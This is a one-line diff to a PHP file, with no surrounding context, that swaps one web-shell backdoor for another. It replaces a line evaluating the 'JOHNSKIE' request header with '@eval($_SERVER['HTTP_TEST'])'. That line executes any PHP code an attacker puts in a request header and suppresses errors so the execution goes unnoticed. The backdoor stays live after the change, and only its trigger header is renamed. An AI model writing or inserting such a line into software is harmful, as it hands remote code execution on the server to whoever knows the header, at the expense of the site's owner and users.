@@ -1,1 +1,1 @@
-?php @eval($_SERVER['HTTP_JOHNSKIE']); ?>
+<?php @eval($_SERVER['HTTP_TEST']); ?>
